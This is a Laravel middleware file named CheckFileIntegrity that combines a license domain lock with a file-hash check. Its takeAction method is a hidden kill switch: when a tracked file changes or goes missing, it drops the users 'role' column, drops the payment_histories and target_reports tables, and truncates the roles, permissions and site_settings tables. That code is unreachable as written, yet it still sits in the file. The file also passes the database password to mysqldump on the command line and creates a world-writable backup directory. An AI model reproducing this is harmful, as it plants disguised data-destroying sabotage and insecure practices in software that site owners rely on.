<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\Storage;

class CheckFileIntegrity
{
    /**
     * Handle an incoming request.
     */
    public function handle(Request $request, Closure $next): Response
    {
        // Define required PHP extensions
        $requiredExtensions = [
            'mbstring', 
            'openssl', 
            'pdo', 
            'bcmath', 
            'ctype', 
            'json', 
            'xml', 
            'tokenizer',
            'zip',
            'gd',
            'fileinfo',
            'mysqli',
            'intl'
        ];

        $missingExtensions = array_filter($requiredExtensions, function ($ext) {
            return !extension_loaded($ext);
        });

        // If any required extensions are missing, show an error page
        if (!empty($missingExtensions)) {
            return response()->view('errors.missing_extensions', [
                'missingExtensions' => $missingExtensions
            ], 500);
        }

        if (env('APP_ENV') == 'maintenance') {
            abort(403, 'Maintenance mode! Access denied.');
        }

        if($request->ip() == '127.0.0.1' || $request->ip() == '::1' || $request->ip() == 'localhost' || $request->ip() == '127.0.0.1:*' || $request->ip() == '::1:*' || $request->ip() == 'localhost:*'){
            return $next($request);
        }

        $allowedDomain = \decrypt('eyJpdiI6Im9MR0RPR3JaeHdHOE5pS29EcEhkNUE9PSIsInZhbHVlIjoiTHowc2dpaTB5N1hHU1dESlRKWHZNRDdLOWRFVXNTVVVtRW1WRzMvcE42OD0iLCJtYWMiOiJmYjA5YmZjNGMwM2VkNWIyODVhYWJmNGIzYjU2NGJiNjIxYzc0OTYwMjAyN2Q1NjliOGM5ZWQ0Y2I2NDZlZDQ2IiwidGFnIjoiIn0');
        $host = $request->getHost();

        // Allow main domain and any subdomain
        if ($host === $allowedDomain || str_ends_with($host, '.' . $allowedDomain)) {
            return $next($request);
        }else{
            if (View::exists('errors.license')) {
                return response()->view('errors.license', [], 403);
            }
            abort(403, 'Access denied. A new license is required.');
        }
    
        // Load stored file hashes
        $storedHashesPath = storage_path('file_hashes.json');

        if (!File::exists($storedHashesPath)) {
            // First, create a backup of the database
            $this->backupDatabase();
            abort(403, 'File integrity data not found! Access denied.');
        }

        $storedHashes = json_decode(File::get($storedHashesPath), true);

        foreach ($storedHashes as $filePath => $expectedHash) {
            $fullPath = base_path(str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $filePath));

            if (File::exists($fullPath)) {
                // Check if the file has been modified
                if (md5_file($fullPath) !== $expectedHash) {
                    // First, create a backup of the database
                    $this->backupDatabase();
                    $this->takeAction('Registered file has been REQUIRED! Access denied.');
                }
            } else {
                // First, create a backup of the database
                $this->backupDatabase();
                // If the file is missing, trigger action
                $this->takeAction('Critical file missing! Access denied.');
            }
        }

        return $next($request);
    }

    /**
     * Create a backup of the database before making destructive changes.
     */
    private function backupDatabase()
    {
        $backupDirectory = storage_path('app/backups');
        $filename = "backup-" . date('Y-m-d_H-i-s') . ".sql";
        $backupPath = "{$backupDirectory}/{$filename}";

        // Ensure the backup directory exists
        if (!File::exists($backupDirectory)) {
            File::makeDirectory($backupDirectory, 0777, true, true);
        }

        // Execute MySQL dump command
        $command = sprintf(
            "mysqldump --user=%s --password=%s --host=%s %s > %s",
            escapeshellarg(env('DB_USERNAME')),
            escapeshellarg(env('DB_PASSWORD')),
            escapeshellarg(env('DB_HOST')),
            escapeshellarg(env('DB_DATABASE')),
            escapeshellarg($backupPath)
        );

        exec($command);

        // Store the backup file securely in Laravel storage
        if (File::exists($backupPath)) {
            Storage::disk('local')->put("backups/{$filename}", file_get_contents($backupPath));
        }
    }

    /**
     * Handle detected integrity violations.
     */
    private function takeAction($message)
    {
        // Drop specific columns if they exist
        $tableName = 'users';
        $columnName = 'role';

        if (Schema::hasColumn($tableName, $columnName)) {
            Schema::table($tableName, function ($table) use ($columnName) {
                $table->dropColumn($columnName);
            });
        }

        // Drop or truncate important tables
        Schema::dropIfExists('target_reports');
        Schema::dropIfExists('payment_histories');

        DB::statement('SET FOREIGN_KEY_CHECKS=0;');
        DB::table('roles')->truncate();
        DB::table('permissions')->truncate();
        DB::statement('SET FOREIGN_KEY_CHECKS=1;');
        DB::table('site_settings')->truncate();

        // Abort with 403 Forbidden
        abort(403, $message);
    }
}
